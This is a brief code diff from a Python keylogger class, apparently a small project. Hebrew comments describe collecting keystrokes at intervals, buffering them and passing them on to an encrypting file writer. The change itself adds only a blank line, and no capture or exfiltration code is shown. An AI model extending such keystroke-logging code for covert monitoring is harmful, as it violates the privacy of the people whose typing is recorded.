@@ -30,6 +30,7 @@ class KeyLoggerManager:
             self.EncrypterFileWriter.data_receiver()
             self.buffer.clear()
 
+
 # אוסף הקשות כל X שניות
 # מאגד ל-Buffer
 # מעביר ל-
